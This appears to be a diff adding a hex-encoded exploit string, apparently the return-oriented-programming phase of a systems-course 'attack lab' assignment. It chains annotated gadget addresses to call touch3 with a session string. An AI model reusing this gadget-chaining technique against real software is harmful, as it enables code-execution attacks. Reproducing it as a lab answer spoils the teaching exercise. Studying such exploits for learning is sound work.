@@ -1,0 +1,16 @@
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+06 1a 40 00 00 00 00 00 /* set return address to <addval_190+0x3> { [movq %rsp, %rax], [retq] } */
+a2 19 40 00 00 00 00 00 /* set return address to <addval_273+0x2> { [movq %rax, %rdi], [retq] } */
+ab 19 40 00 00 00 00 00 /* set return address to <addval_219+0x4> { [popq %rax], [nop], [retq] } */
+48 00 00 00 00 00 00 00 /* offset from old %rsp to string data */
+dd 19 40 00 00 00 00 00 /* set return address to <getval_481+0x2> { [movl %eax, %edx], [nop], [retq] } */
+34 1a 40 00 00 00 00 00 /* set return address to <getval_159+0x1> { [movl %edx, %ecx], [cmpb %cl, %cl], [retq] } */
+27 1a 40 00 00 00 00 00 /* set return address to <addval_187+0x2> { [movl %ecx, %esi], [cmpb %al, %al], [retq] } */
+d6 19 40 00 00 00 00 00 /* set return address to <add_xy>         { [lea (%rdi, %rsi, 1), %rax], [retq] } */
+a2 19 40 00 00 00 00 00 /* set return address to <addval_273+0x2> { [movq %rax, %rdi], [retq] } */
+fa 18 40 00 00 00 00 00 /* set return address to touch3 */
+35 39 62 39 39 37 66 61 /* string data of session */
